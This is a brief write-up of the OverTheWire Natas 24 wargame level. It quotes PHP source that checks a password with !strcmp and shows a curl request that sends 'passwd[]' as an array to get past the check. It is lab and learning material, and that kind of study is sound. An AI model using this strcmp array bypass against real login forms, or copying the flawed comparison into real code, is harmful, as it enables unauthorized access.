# Natas 24 -> 25

```
http://natas24.natas.labs.overthewire.org
```

```
Username: natas24
```

Same form, same source code:

```php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
```

Except this time it uses `!strcmp` to validate the password and `strcmp` compares `Strings`.
```
Returns < 0 if str1 is less than str2; > 0 if str1 is greater than str2, and 0 if they are equal.
```

What happens if we try to pass more than one password, as in an `Array`?

```bash
$ curl -v --user natas24:${NATAS24_PASSWD} "http://natas24.natas.labs.overthewire.org/" -d "passwd[]=loveyoumorla"
```


* php
* strcmp
